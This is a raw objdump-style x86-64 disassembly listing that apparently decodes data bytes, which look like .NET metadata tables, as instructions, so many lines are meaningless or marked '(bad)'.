  4077f1:	00 2d 00 53 00 13    	add    %ch,0x13005300(%rip)        # 0x1340caf7
  4077f7:	01 00                	add    %eax,(%rax)
  4077f9:	00 b5 03 00 00 3d    	add    %dh,0x3d000003(%rbp)
  4077ff:	00 2d 00 53 00 13    	add    %ch,0x13005300(%rip)        # 0x1340cb05
  407805:	01 00                	add    %eax,(%rax)
  407807:	00 d2                	add    %dl,%dl
  407809:	03 00                	add    (%rax),%eax
  40780b:	00 3d 00 2d 00 53    	add    %bh,0x53002d00(%rip)        # 0x5340a511
  407811:	00 13                	add    %dl,(%rbx)
  407813:	01 00                	add    %eax,(%rax)
  407815:	00 ef                	add    %ch,%bh
  407817:	03 00                	add    (%rax),%eax
  407819:	00 3d 00 2d 00 53    	add    %bh,0x53002d00(%rip)        # 0x5340a51f
  40781f:	00 16                	add    %dl,(%rsi)
  407821:	00 0c 04             	add    %cl,(%rsp,%rax,1)
  407824:	d3 00                	roll   %cl,(%rax)
  407826:	16                   	(bad)
  407827:	00 31                	add    %dh,(%rcx)
  407829:	04 d7                	add    $0xd7,%al
  40782b:	00 16                	add    %dl,(%rsi)
  40782d:	00 43 04             	add    %al,0x4(%rbx)
  407830:	da 00                	fiaddl (%rax)
  407832:	13 00                	adc    (%rax),%eax
  407834:	29 09                	sub    %ecx,(%rcx)
  407836:	1d 02 11 00 7e       	sbb    $0x7e001102,%eax
  40783b:	0a 90 02 11 00 88    	or     -0x77ffeefe(%rax),%dl
  407841:	0a 90 02 11 00 92    	or     -0x6dffeefe(%rax),%dl
  407847:	0a d3                	or     %bl,%dl
  407849:	00 11                	add    %dl,(%rcx)
  40784b:	00 9c 0a d3 00 11 00 	add    %bl,0x1100d3(%rdx,%rcx,1)
  407852:	a6                   	cmpsb  (%rdi),(%rsi)
  407853:	0a 93 02 11 00 b0    	or     -0x4fffeefe(%rbx),%dl
  407859:	0a 93 02 11 00 ba    	or     -0x45ffeefe(%rbx),%dl
  40785f:	0a 96 02 13 00 c4    	or     -0x3bffecfe(%rsi),%dl
  407865:	0a 9a 02 13 00 ce    	or     -0x31ffecfe(%rdx),%bl
  40786b:	0a 9a 02 11 00 d8    	or     -0x27ffeefe(%rdx),%bl
  407871:	0a d7                	or     %bh,%dl
  407873:	00 11                	add    %dl,(%rcx)
  407875:	00 e2                	add    %ah,%dl
  407877:	0a 90 02 11 00 ec    	or     -0x13ffeefe(%rax),%dl
  40787d:	0a 90 02 11 00 f6    	or     -0x9ffeefe(%rax),%dl
  407883:	0a 9e 02 11 00 1e    	or     0x1e001102(%rsi),%bl
  407889:	0b 90 02 11 00 28    	or     0x28001102(%rax),%edx
  40788f:	0b a3 02 11 00 32    	or     0x32001102(%rbx),%esp
  407895:	0b a6 02 11 00 3c    	or     0x3c001102(%rsi),%esp
  40789b:	0b d7                	or     %edi,%edx
  40789d:	00 13                	add    %dl,(%rbx)
  40789f:	00 46 0b             	add    %al,0xb(%rsi)
  4078a2:	ab                   	stos   %eax,(%rdi)
  4078a3:	02 11                	add    (%rcx),%dl
  4078a5:	00 5a 0b             	add    %bl,0xb(%rdx)
  4078a8:	93                   	xchg   %eax,%ebx
  4078a9:	02 11                	add    (%rcx),%dl
  4078ab:	00 64 0b d3          	add    %ah,-0x2d(%rbx,%rcx,1)
  4078af:	00 11                	add    %dl,(%rcx)
  4078b1:	00 6e 0b             	add    %ch,0xb(%rsi)
  4078b4:	b0 02                	mov    $0x2,%al
  4078b6:	11 00                	adc    %eax,(%rax)
  4078b8:	7e 0b                	jle    0x4078c5
  4078ba:	d7                   	xlat   (%rbx)
  4078bb:	00 11                	add    %dl,(%rcx)
  4078bd:	00 88 0b d3 00 11    	add    %cl,0x1100d30b(%rax)
  4078c3:	00 92 0b b3 02 11    	add    %dl,0x1102b30b(%rdx)
  4078c9:	00 a3 0b 90 02 11    	add    %ah,0x1102900b(%rbx)
  4078cf:	00 ad 0b b0 02 11    	add    %ch,0x1102b00b(%rbp)
  4078d5:	00 b7 0b d7 00 11    	add    %dh,0x1100d70b(%rdi)
  4078db:	00 c1                	add    %al,%cl
  4078dd:	0b 90 02 03 00 aa    	or     -0x55fffcfe(%rax),%edx
  4078e3:	11 90 02 03 00 b4    	adc    %edx,-0x4bfffcfe(%rax)
  4078e9:	11 d3                	adc    %edx,%ebx
  4078eb:	00 06                	add    %al,(%rsi)
  4078ed:	06                   	(bad)
  4078ee:	bf 11 d7 00 11       	mov    $0x1100d711,%edi
  4078f3:	00 c7                	add    %al,%bh
  4078f5:	11 90 02 13 01 e0    	adc    %edx,-0x1ffeecfe(%rax)
  4078fb:	11 f7                	adc    %esi,%edi
  4078fd:	04 13                	add    $0x13,%al
  4078ff:	01 f4                	add    %esi,%esp
  407901:	11 fb                	adc    %edi,%ebx
  407903:	04 13                	add    $0x13,%al
  407905:	01 08                	add    %ecx,(%rax)
  407907:	12 ff                	adc    %bh,%bh
  407909:	04 13                	add    $0x13,%al
  40790b:	01 1c 12             	add    %ebx,(%rdx,%rdx,1)
  40790e:	03 05 13 01 30 12    	add    0x12300113(%rip),%eax        # 0x12707a27
  407914:	07                   	(bad)
  407915:	05 13 01 44 12       	add    $0x12440113,%eax
  40791a:	03 05 13 01 58 12    	add    0x12580113(%rip),%eax        # 0x12987a33
  407920:	0b 05 13 01 6c 12    	or     0x126c0113(%rip),%eax        # 0x12ac7a39
  407926:	0f 05                	syscall
  407928:	50                   	push   %rax
  407929:	20 00                	and    %al,(%rax)
  40792b:	00 08                	add    %cl,(%rax)
  40792d:	00 96 00 62 04 dd    	add    %dl,-0x22fb9e00(%rsi)
  407933:	00 01                	add    %al,(%rcx)
  407935:	00 9c 20 00 00 08 00 	add    %bl,0x80000(%rax,%riz,1)
  40793c:	96                   	xchg   %eax,%esi
  40793d:	00 9e 04 dd 00 01    	add    %bl,0x100dd04(%rsi)
  407943:	00 74 24 00          	add    %dh,0x0(%rsp)
  407947:	00 08                	add    %cl,(%rax)
  407949:	00 96 00 e5 06 87    	add    %dl,-0x78f91b00(%rsi)
  40794f:	01 01                	add    %eax,(%rcx)
  407951:	00 90 24 00 00 08    	add    %dl,0x8000024(%rax)
  407957:	00 96 00 4a 07 a7    	add    %dl,-0x58f8b600(%rsi)
  40795d:	01 02                	add    %eax,(%rdx)
  40795f:	00 98 25 00 00 08    	add    %bl,0x8000025(%rax)
  407965:	00 96 00 83 08 07    	add    %dl,0x7088300(%rsi)
  40796b:	02 04 00             	add    (%rax,%rax,1),%al
  40796e:	0c 26                	or     $0x26,%al
  407970:	00 00                	add    %al,(%rax)
  407972:	08 00                	or     %al,(%rax)
  407974:	86 18                	xchg   %bl,(%rax)
  407976:	43 00 cf             	rex.XB add %cl,%r15b
  407979:	00 06                	add    %al,(%rsi)
  40797b:	00 24 26             	add    %ah,(%rsi,%riz,1)
  40797e:	00 00                	add    %al,(%rax)
  407980:	08 00                	or     %al,(%rax)
  407982:	91                   	xchg   %eax,%ecx
  407983:	18 fe                	sbb    %bh,%dh
  407985:	08 dd                	or     %bl,%ch
  407987:	00 06                	add    %al,(%rsi)
  407989:	00 64 26 00          	add    %ah,0x0(%rsi,%riz,1)
  40798d:	00 08                	add    %cl,(%rax)
  40798f:	00 93 00 3a 09 e7    	add    %dl,-0x18f6c600(%rbx)
  407995:	00 06                	add    %al,(%rsi)
  407997:	00 dc                	add    %bl,%ah
  407999:	26 00 00             	es add %al,(%rax)
  40799c:	08 00                	or     %al,(%rax)
  40799e:	86 18                	xchg   %bl,(%rax)
  4079a0:	43 00 cf             	rex.XB add %cl,%r15b
  4079a3:	00 07                	add    %al,(%rdi)
  4079a5:	00 f4                	add    %dh,%ah
  4079a7:	26 00 00             	es add %al,(%rax)
  4079aa:	08 00                	or     %al,(%rax)
  4079ac:	91                   	xchg   %eax,%ecx
  4079ad:	18 fe                	sbb    %bh,%dh
  4079af:	08 dd                	or     %bl,%ch
  4079b1:	00 07                	add    %al,(%rdi)
  4079b3:	00 00                	add    %al,(%rax)
  4079b5:	00 00                	add    %al,(%rax)
  4079b7:	00 03                	add    %al,(%rbx)
  4079b9:	00 86 18 43 00 73    	add    %al,0x73004318(%rsi)
  4079bf:	02 07                	add    (%rdi),%al
  4079c1:	00 00                	add    %al,(%rax)
  4079c3:	00 00                	add    %al,(%rax)
  4079c5:	00 03                	add    %al,(%rbx)
  4079c7:	00 c6                	add    %al,%dh
  4079c9:	01 2d 0a 79 02 09    	add    %ebp,0x902790a(%rip)        # 0x942f2d9
  4079cf:	00 00                	add    %al,(%rax)
  4079d1:	00 00                	add    %al,(%rax)
  4079d3:	00 03                	add    %al,(%rbx)
  4079d5:	00 c6                	add    %al,%dh
  4079d7:	01 36                	add    %esi,(%rsi)
  4079d9:	0a 7e 02             	or     0x2(%rsi),%bh
  4079dc:	0a 00                	or     (%rax),%al
  4079de:	00 00                	add    %al,(%rax)
  4079e0:	00 00                	add    %al,(%rax)
  4079e2:	03 00                	add    (%rax),%eax
  4079e4:	c6 01 6d             	movb   $0x6d,(%rcx)
  4079e7:	0a 89 02 0d 00 1c    	or     0x1c000d02(%rcx),%cl
  4079ed:	27                   	(bad)
  4079ee:	00 00                	add    %al,(%rax)
  4079f0:	08 00                	or     %al,(%rax)
  4079f2:	91                   	xchg   %eax,%ecx
  4079f3:	18 fe                	sbb    %bh,%dh
  4079f5:	08 dd                	or     %bl,%ch
  4079f7:	00 0e                	add    %cl,(%rsi)
  4079f9:	00 50 28             	add    %dl,0x28(%rax)
  4079fc:	00 00                	add    %al,(%rax)
  4079fe:	08 00                	or     %al,(%rax)
  407a00:	81 00 38 0c cf 00    	addl   $0xcf0c38,(%rax)
  407a06:	0e                   	(bad)
  407a07:	00 58 28             	add    %bl,0x28(%rax)
  407a0a:	00 00                	add    %al,(%rax)
  407a0c:	08 00                	or     %al,(%rax)
  407a0e:	93                   	xchg   %eax,%ebx
  407a0f:	00 46 0c             	add    %al,0xc(%rsi)
  407a12:	c6 02 0e             	movb   $0xe,(%rdx)
  407a15:	00 04 2f             	add    %al,(%rdi,%rbp,1)
  407a18:	00 00                	add    %al,(%rax)
  407a1a:	08 00                	or     %al,(%rax)
  407a1c:	91                   	xchg   %eax,%ecx
  407a1d:	00 69 0c             	add    %ch,0xc(%rcx)
  407a20:	fb                   	sti
  407a21:	02 0f                	add    (%rdi),%cl
  407a23:	00 34 2f             	add    %dh,(%rdi,%rbp,1)
  407a26:	00 00                	add    %al,(%rax)
  407a28:	08 00                	or     %al,(%rax)
  407a2a:	91                   	xchg   %eax,%ecx
  407a2b:	00 7a 0c             	add    %bh,0xc(%rdx)
  407a2e:	fb                   	sti
  407a2f:	02 17                	add    (%rdi),%dl
  407a31:	00 64 2f 00          	add    %ah,0x0(%rdi,%rbp,1)
  407a35:	00 08                	add    %cl,(%rax)
  407a37:	00 91 00 84 0c fb    	add    %dl,-0x4f37c00(%rcx)
  407a3d:	02 1f                	add    (%rdi),%bl
  407a3f:	00 90 2f 00 00 08    	add    %dl,0x800002f(%rax)
  407a45:	00 91 00 8e 0c fb    	add    %dl,-0x4f37200(%rcx)
  407a4b:	02 27                	add    (%rdi),%ah
  407a4d:	00 c0                	add    %al,%al
  407a4f:	2f                   	(bad)
  407a50:	00 00                	add    %al,(%rax)
  407a52:	08 00                	or     %al,(%rax)
  407a54:	91                   	xchg   %eax,%ecx
  407a55:	00 98 0c 09 03 2f    	add    %bl,0x2f03090c(%rax)
  407a5b:	00 d8                	add    %bl,%al
  407a5d:	2f                   	(bad)
  407a5e:	00 00                	add    %al,(%rax)
  407a60:	08 00                	or     %al,(%rax)
  407a62:	93                   	xchg   %eax,%ebx
  407a63:	00 a2 0c 0f 03 31    	add    %ah,0x31030f0c(%rdx)
  407a69:	00 f8                	add    %bh,%al
  407a6b:	2f                   	(bad)
  407a6c:	00 00                	add    %al,(%rax)
  407a6e:	08 00                	or     %al,(%rax)
  407a70:	93                   	xchg   %eax,%ebx
  407a71:	00 ac 0c 13 03 31 00 	add    %ch,0x310313(%rsp,%rcx,1)
  407a78:	5c                   	pop    %rsp
  407a79:	30 00                	xor    %al,(%rax)
  407a7b:	00 08                	add    %cl,(%rax)
  407a7d:	00 93 00 20 0d dd    	add    %dl,-0x22f2e000(%rbx)
  407a83:	00 31                	add    %dh,(%rcx)
  407a85:	00 94 30 00 00 08 00 	add    %dl,0x80000(%rax,%rsi,1)
  407a8c:	93                   	xchg   %eax,%ebx
  407a8d:	00 53 0d             	add    %dl,0xd(%rbx)
  407a90:	c6 02 31             	movb   $0x31,(%rdx)
  407a93:	00 b8 30 00 00 08    	add    %bh,0x8000030(%rax)
  407a99:	00 91 00 90 0d 32    	add    %dl,0x320d9000(%rcx)
  407a9f:	03 32                	add    (%rdx),%esi
  407aa1:	00 c8                	add    %cl,%al
  407aa3:	30 00                	xor    %al,(%rax)
  407aa5:	00 08                	add    %cl,(%rax)
  407aa7:	00 93 00 a5 0d 37    	add    %dl,0x370da500(%rbx)
  407aad:	03 33                	add    (%rbx),%esi
  407aaf:	00 2c 6c             	add    %ch,(%rsp,%rbp,2)
  407ab2:	00 00                	add    %al,(%rax)
  407ab4:	08 00                	or     %al,(%rax)
  407ab6:	93                   	xchg   %eax,%ebx
  407ab7:	00 bc 0d 87 01 34 00 	add    %bh,0x340187(%rbp,%rcx,1)
  407abe:	60                   	(bad)
  407abf:	6c                   	insb   (%dx),(%rdi)
  407ac0:	00 00                	add    %al,(%rax)
  407ac2:	08 00                	or     %al,(%rax)
  407ac4:	91                   	xchg   %eax,%ecx
  407ac5:	00 d7                	add    %dl,%bh
  407ac7:	0d 9c 03 35 00       	or     $0x35039c,%eax
  407acc:	68 6c 00 00 08       	push   $0x800006c
  407ad1:	00 91 00 e1 0d dd    	add    %dl,-0x22f21f00(%rcx)
  407ad7:	00 35 00 9c 6c 00    	add    %dh,0x6c9c00(%rip)        # 0xad16dd
  407add:	00 08                	add    %cl,(%rax)
  407adf:	00 91 00 eb 0d a0    	add    %dl,-0x5ff21500(%rcx)
  407ae5:	03 35 00 04 6d 00    	add    0x6d0400(%rip),%esi        # 0xad7eeb
  407aeb:	00 08                	add    %cl,(%rax)
  407aed:	00 93 00 26 0e c5    	add    %dl,-0x3af1da00(%rbx)
  407af3:	03 37                	add    (%rdi),%esi
  407af5:	00 38                	add    %bh,(%rax)
  407af7:	6e                   	outsb  (%rsi),(%dx)
  407af8:	00 00                	add    %al,(%rax)
  407afa:	08 00                	or     %al,(%rax)
  407afc:	91                   	xchg   %eax,%ecx
  407afd:	00 91 0e e1 00 38    	add    %dl,0x3800e10e(%rcx)
  407b03:	00 b0 6e 00 00 08    	add    %dh,0x800006e(%rax)
  407b09:	00 91 00 c9 0e c6    	add    %dl,-0x39f13700(%rcx)
  407b0f:	02 39                	add    (%rcx),%bh
  407b11:	00 24 6f             	add    %ah,(%rdi,%rbp,2)
  407b14:	00 00                	add    %al,(%rax)
  407b16:	08 00                	or     %al,(%rax)
  407b18:	81 00 e2 0e 02 02    	addl   $0x2020ee2,(%rax)
  407b1e:	3a 00                	cmp    (%rax),%al
  407b20:	38 6f 00             	cmp    %ch,0x0(%rdi)
  407b23:	00 08                	add    %cl,(%rax)
  407b25:	00 81 00 ec 0e 02    	add    %al,0x20eec00(%rcx)
  407b2b:	02 3a                	add    (%rdx),%bh
  407b2d:	00 4c 6f 00          	add    %cl,0x0(%rdi,%rbp,2)
  407b31:	00 08                	add    %cl,(%rax)
  407b33:	00 81 00 f6 0e 02    	add    %al,0x20ef600(%rcx)
  407b39:	02 3a                	add    (%rdx),%bh
  407b3b:	00 90 6f 00 00 08    	add    %dl,0x800006f(%rax)
  407b41:	00 81 00 00 0f 02    	add    %al,0x20f0000(%rcx)
  407b47:	02 3a                	add    (%rdx),%bh
  407b49:	00 d4                	add    %dl,%ah
  407b4b:	6f                   	outsl  (%rsi),(%dx)
  407b4c:	00 00                	add    %al,(%rax)
  407b4e:	08 00                	or     %al,(%rax)
  407b50:	81 00 0a 0f 02 02    	addl   $0x2020f0a,(%rax)
  407b56:	3a 00                	cmp    (%rax),%al
  407b58:	18 70 00             	sbb    %dh,0x0(%rax)
  407b5b:	00 08                	add    %cl,(%rax)
  407b5d:	00 81 00 14 0f 02    	add    %al,0x20f1400(%rcx)
  407b63:	02 3a                	add    (%rdx),%bh
  407b65:	00 5c 70 00          	add    %bl,0x0(%rax,%rsi,2)
  407b69:	00 08                	add    %cl,(%rax)
  407b6b:	00 83 00 1e 0f 02    	add    %al,0x20f1e00(%rbx)
  407b71:	02 3a                	add    (%rdx),%bh
  407b73:	00 a0 70 00 00 08    	add    %ah,0x8000070(%rax)
  407b79:	00 83 00 28 0f 02    	add    %al,0x20f2800(%rbx)
  407b7f:	02 3a                	add    (%rdx),%bh
  407b81:	00 e4                	add    %ah,%ah
  407b83:	70 00                	jo     0x407b85
  407b85:	00 08                	add    %cl,(%rax)
  407b87:	00 83 00 32 0f 02    	add    %al,0x20f3200(%rbx)
  407b8d:	02 3a                	add    (%rdx),%bh
  407b8f:	00 28                	add    %ch,(%rax)
  407b91:	71 00                	jno    0x407b93
  407b93:	00 08                	add    %cl,(%rax)
  407b95:	00 83 00 3c 0f 02    	add    %al,0x20f3c00(%rbx)
  407b9b:	02 3a                	add    (%rdx),%bh
  407b9d:	00 6c 71 00          	add    %ch,0x0(%rcx,%rsi,2)
  407ba1:	00 08                	add    %cl,(%rax)
  407ba3:	00 86 18 43 00 cf    	add    %al,-0x30ffbce8(%rsi)
  407ba9:	00 3a                	add    %bh,(%rdx)
  407bab:	00 7c 71 00          	add    %bh,0x0(%rcx,%rsi,2)
  407baf:	00 08                	add    %cl,(%rax)
  407bb1:	00 93 00 46 0f 3c    	add    %dl,0x3c0f4600(%rbx)
  407bb7:	04 3a                	add    $0x3a,%al
  407bb9:	00 90 71 00 00 08    	add    %dl,0x8000071(%rax)
  407bbf:	00 93 00 73 0f c5    	add    %dl,-0x3af08d00(%rbx)
  407bc5:	03 3a                	add    (%rdx),%edi
  407bc7:	00 a0 71 00 00 08    	add    %ah,0x8000071(%rax)
  407bcd:	00 93 00 95 0f 4f    	add    %dl,0x4f0f9500(%rbx)
  407bd3:	04 3a                	add    $0x3a,%al
  407bd5:	00 b4 71 00 00 08 00 	add    %dh,0x80000(%rcx,%rsi,2)
  407bdc:	93                   	xchg   %eax,%ebx
  407bdd:	00 b5 0f 5a 04 3a    	add    %dh,0x3a045a0f(%rbp)
  407be3:	00 c4                	add    %al,%ah
  407be5:	71 00                	jno    0x407be7
  407be7:	00 08                	add    %cl,(%rax)
  407be9:	00 93 00 c8 0f 5f    	add    %dl,0x5f0fc800(%rbx)
  407bef:	04 3a                	add    $0x3a,%al
  407bf1:	00 d8                	add    %bl,%al
  407bf3:	71 00                	jno    0x407bf5
  407bf5:	00 08                	add    %cl,(%rax)
  407bf7:	00 93 00 e5 0f 65    	add    %dl,0x650fe500(%rbx)
  407bfd:	04 3a                	add    $0x3a,%al
  407bff:	00 e8                	add    %ch,%al
  407c01:	71 00                	jno    0x407c03
  407c03:	00 08                	add    %cl,(%rax)
  407c05:	00 93 00 f8 0f 65    	add    %dl,0x650ff800(%rbx)
  407c0b:	04 3a                	add    $0x3a,%al
  407c0d:	00 f8                	add    %bh,%al
  407c0f:	71 00                	jno    0x407c11
  407c11:	00 08                	add    %cl,(%rax)
  407c13:	00 93 00 13 10 c5    	add    %dl,-0x3aefed00(%rbx)
  407c19:	03 3a                	add    (%rdx),%edi
  407c1b:	00 08                	add    %cl,(%rax)
  407c1d:	72 00                	jb     0x407c1f
  407c1f:	00 08                	add    %cl,(%rax)
  407c21:	00 93 00 26 10 c5    	add    %dl,-0x3aefda00(%rbx)
  407c27:	03 3a                	add    (%rdx),%edi
  407c29:	00 18                	add    %bl,(%rax)
  407c2b:	72 00                	jb     0x407c2d
  407c2d:	00 08                	add    %cl,(%rax)
  407c2f:	00 93 00 4b 10 71    	add    %dl,0x71104b00(%rbx)
  407c35:	04 3a                	add    $0x3a,%al
  407c37:	00 24 72             	add    %ah,(%rdx,%rsi,2)
  407c3a:	00 00                	add    %al,(%rax)
  407c3c:	08 00                	or     %al,(%rax)
  407c3e:	93                   	xchg   %eax,%ebx
  407c3f:	00 5e 10             	add    %bl,0x10(%rsi)
  407c42:	75 04                	jne    0x407c48
  407c44:	3a 00                	cmp    (%rax),%al
  407c46:	38 72 00             	cmp    %dh,0x0(%rdx)
  407c49:	00 08                	add    %cl,(%rax)
  407c4b:	00 93 00 71 10 7d    	add    %dl,0x7d107100(%rbx)
  407c51:	04 3a                	add    $0x3a,%al
  407c53:	00 50 72             	add    %dl,0x72(%rax)
  407c56:	00 00                	add    %al,(%rax)
  407c58:	08 00                	or     %al,(%rax)
  407c5a:	93                   	xchg   %eax,%ebx
  407c5b:	00 84 10 84 04 3a 00 	add    %al,0x3a0484(%rax,%rdx,1)
  407c62:	6c                   	insb   (%dx),(%rdi)
  407c63:	72 00                	jb     0x407c65
  407c65:	00 08                	add    %cl,(%rax)
  407c67:	00 93 00 97 10 65    	add    %dl,0x65109700(%rbx)
  407c6d:	04 3a                	add    $0x3a,%al
  407c6f:	00 7c 72 00          	add    %bh,0x0(%rdx,%rsi,2)
  407c73:	00 08                	add    %cl,(%rax)
  407c75:	00 93 00 ba 10 c5    	add    %dl,-0x3aef4600(%rbx)
  407c7b:	03 3a                	add    (%rdx),%edi
  407c7d:	00 8c 72 00 00 08 00 	add    %cl,0x80000(%rdx,%rsi,2)
  407c84:	93                   	xchg   %eax,%ebx
  407c85:	00 cd                	add    %cl,%ch
  407c87:	10 65 04             	adc    %ah,0x4(%rbp)
  407c8a:	3a 00                	cmp    (%rax),%al
  407c8c:	9c                   	pushf
  407c8d:	72 00                	jb     0x407c8f
  407c8f:	00 08                	add    %cl,(%rax)
  407c91:	00 93 00 e0 10 8c    	add    %dl,-0x73ef2000(%rbx)
  407c97:	04 3a                	add    $0x3a,%al
  407c99:	00 b0 72 00 00 08    	add    %dh,0x8000072(%rax)
  407c9f:	00 93 00 fb 10 71    	add    %dl,0x7110fb00(%rbx)
  407ca5:	04 3a                	add    $0x3a,%al
  407ca7:	00 bc 72 00 00 08 00 	add    %bh,0x80000(%rdx,%rsi,2)
  407cae:	93                   	xchg   %eax,%ebx
  407caf:	00 0e                	add    %cl,(%rsi)
  407cb1:	11 99 04 3a 00 d8    	adc    %ebx,-0x27ffc5fc(%rcx)
  407cb7:	72 00                	jb     0x407cb9
  407cb9:	00 08                	add    %cl,(%rax)
  407cbb:	00 93 00 21 11 0f    	add    %dl,0xf112100(%rbx)
  407cc1:	03 3a                	add    (%rdx),%edi
  407cc3:	00 e0                	add    %ah,%al
  407cc5:	72 00                	jb     0x407cc7
  407cc7:	00 08                	add    %cl,(%rax)
  407cc9:	00 93 00 34 11 0f    	add    %dl,0xf113400(%rbx)
  407ccf:	03 3a                	add    (%rdx),%edi
  407cd1:	00 e8                	add    %ch,%al
  407cd3:	72 00                	jb     0x407cd5
  407cd5:	00 08                	add    %cl,(%rax)
  407cd7:	00 86 18 43 00 79    	add    %al,0x79004318(%rsi)
  407cdd:	02 3a                	add    (%rdx),%bh
  407cdf:	00 00                	add    %al,(%rax)
  407ce1:	73 00                	jae    0x407ce3
  407ce3:	00 08                	add    %cl,(%rax)
  407ce5:	00 86 18 43 00 cf    	add    %al,-0x30ffbce8(%rsi)
  407ceb:	00 3b                	add    %bh,(%rbx)
  407ced:	00 18                	add    %bl,(%rax)
  407cef:	73 00                	jae    0x407cf1
  407cf1:	00 08                	add    %cl,(%rax)
  407cf3:	00 93 00 5a 11 65    	add    %dl,0x65115a00(%rbx)
  407cf9:	01 3b                	add    %edi,(%rbx)
  407cfb:	00 ac 73 00 00 08 00 	add    %ch,0x80000(%rbx,%rsi,2)
  407d02:	86 18                	xchg   %bl,(%rax)
  407d04:	43 00 cf             	rex.XB add %cl,%r15b
  407d07:	00 3d 00 00 00 00    	add    %bh,0x0(%rip)        # 0x407d0d
  407d0d:	00 03                	add    %al,(%rbx)
  407d0f:	00 86 18 43 00 73    	add    %al,0x73004318(%rsi)
  407d15:	02 3d 00 00 00 00    	add    0x0(%rip),%bh        # 0x407d1b
  407d1b:	00 03                	add    %al,(%rbx)
  407d1d:	00 c6                	add    %al,%dh
  407d1f:	01 2d 0a bd 04 3f    	add    %ebp,0x3f04bd0a(%rip)        # 0x3f453a2f
  407d25:	00 00                	add    %al,(%rax)
  407d27:	00 00                	add    %al,(%rax)
  407d29:	00 03                	add    %al,(%rbx)
  407d2b:	00 c6                	add    %al,%dh
  407d2d:	01 36                	add    %esi,(%rsi)
  407d2f:	0a c8                	or     %al,%cl
  407d31:	04 45                	add    $0x45,%al
  407d33:	00 00                	add    %al,(%rax)
  407d35:	00 00                	add    %al,(%rax)
  407d37:	00 03                	add    %al,(%rbx)
  407d39:	00 c6                	add    %al,%dh
  407d3b:	01 6d 0a             	add    %ebp,0xa(%rbp)
  407d3e:	d9 04 4d 00 00 00 00 	flds   0x0(,%rcx,2)
  407d45:	00 03                	add    %al,(%rbx)
  407d47:	00 86 18 43 00 73    	add    %al,0x73004318(%rsi)
  407d4d:	02 4f 00             	add    0x0(%rdi),%cl
  407d50:	00 00                	add    %al,(%rax)
  407d52:	00 00                	add    %al,(%rax)
  407d54:	03 00                	add    (%rax),%eax
  407d56:	c6 01 2d             	movb   $0x2d,(%rcx)
  407d59:	0a e2                	or     %dl,%ah
  407d5b:	04 51                	add    $0x51,%al
  407d5d:	00 00                	add    %al,(%rax)
  407d5f:	00 00                	add    %al,(%rax)
  407d61:	00 03                	add    %al,(%rbx)
  407d63:	00 c6                	add    %al,%dh
  407d65:	01 36                	add    %esi,(%rsi)
  407d67:	0a e6                	or     %dh,%ah
  407d69:	04 51                	add    $0x51,%al
  407d6b:	00 00                	add    %al,(%rax)
  407d6d:	00 00                	add    %al,(%rax)
  407d6f:	00 03                	add    %al,(%rbx)
  407d71:	00 c6                	add    %al,%dh
  407d73:	01 6d 0a             	add    %ebp,0xa(%rbp)
  407d76:	f0 04 53             	lock add $0x53,%al
  407d79:	00 c4                	add    %al,%ah
  407d7b:	73 00                	jae    0x407d7d
  407d7d:	00 08                	add    %cl,(%rax)
  407d7f:	00 93 00 d2 11 dd    	add    %dl,-0x22ee2e00(%rbx)
  407d85:	00 54 00 cc          	add    %dl,-0x34(%rax,%rax,1)
  407d89:	73 00                	jae    0x407d8b
  407d8b:	00 08                	add    %cl,(%rax)
  407d8d:	00 86 18 43 00 cf    	add    %al,-0x30ffbce8(%rsi)
  407d93:	00 54 00 dc          	add    %dl,-0x24(%rax,%rax,1)
  407d97:	73 00                	jae    0x407d99
  407d99:	00 08                	add    %cl,(%rax)
  407d9b:	00 91 18 fe 08 dd    	add    %dl,-0x22f701e8(%rcx)
  407da1:	00 54 00 00          	add    %dl,0x0(%rax,%rax,1)
  407da5:	00 01                	add    %al,(%rcx)
  407da7:	00 fb                	add    %bh,%bl
  407da9:	06                   	(bad)
  407daa:	00 00                	add    %al,(%rax)
  407dac:	01 00                	add    %eax,(%rax)
  407dae:	fb                   	sti
  407daf:	06                   	(bad)
  407db0:	10 10                	adc    %dl,(%rax)
  407db2:	02 00                	add    (%rax),%al
  407db4:	63 07                	movsxd (%rdi),%eax
  407db6:	00 00                	add    %al,(%rax)
  407db8:	01 00                	add    %eax,(%rax)
  407dba:	fb                   	sti
  407dbb:	06                   	(bad)
  407dbc:	00 00                	add    %al,(%rax)
  407dbe:	02 00                	add    (%rax),%al
  407dc0:	63 07                	movsxd (%rdi),%eax
  407dc2:	00 00                	add    %al,(%rax)
  407dc4:	01 00                	add    %eax,(%rax)
  407dc6:	48 09 00             	or     %rax,(%rax)
  407dc9:	00 01                	add    %al,(%rcx)
  407dcb:	00 24 0a             	add    %ah,(%rdx,%rcx,1)
  407dce:	00 00                	add    %al,(%rax)
  407dd0:	02 00                	add    (%rax),%al
  407dd2:	24 0a                	and    $0xa,%al
  407dd4:	00 00                	add    %al,(%rax)
  407dd6:	01 00                	add    %eax,(%rax)
  407dd8:	34 0a                	xor    $0xa,%al
  407dda:	00 00                	add    %al,(%rax)
  407ddc:	01 00                	add    %eax,(%rax)
  407dde:	34 0a                	xor    $0xa,%al
  407de0:	00 00                	add    %al,(%rax)
  407de2:	02 00                	add    (%rax),%al
  407de4:	5d                   	pop    %rbp
  407de5:	0a 00                	or     (%rax),%al
  407de7:	00 03                	add    %al,(%rbx)
  407de9:	00 66 0a             	add    %ah,0xa(%rsi)
  407dec:	00 00                	add    %al,(%rax)
  407dee:	01 00                	add    %eax,(%rax)
  407df0:	77 0a                	ja     0x407dfc
  407df2:	00 00                	add    %al,(%rax)
  407df4:	01 00                	add    %eax,(%rax)
  407df6:	24 0a                	and    $0xa,%al
  407df8:	00 00                	add    %al,(%rax)
  407dfa:	01 00                	add    %eax,(%rax)
  407dfc:	24 0a                	and    $0xa,%al
  407dfe:	00 00                	add    %al,(%rax)
  407e00:	02 00                	add    (%rax),%al
  407e02:	24 0a                	and    $0xa,%al
  407e04:	00 00                	add    %al,(%rax)
  407e06:	03 00                	add    (%rax),%eax
  407e08:	24 0a                	and    $0xa,%al
  407e0a:	00 00                	add    %al,(%rax)
  407e0c:	04 00                	add    $0x0,%al
  407e0e:	24 0a                	and    $0xa,%al
  407e10:	00 00                	add    %al,(%rax)
  407e12:	05 00 24 0a 00       	add    $0xa2400,%eax
  407e17:	00 06                	add    %al,(%rsi)
  407e19:	00 24 0a             	add    %ah,(%rdx,%rcx,1)
  407e1c:	00 00                	add    %al,(%rax)
  407e1e:	07                   	(bad)
  407e1f:	00 24 0a             	add    %ah,(%rdx,%rcx,1)
  407e22:	00 00                	add    %al,(%rax)
  407e24:	08 00                	or     %al,(%rax)
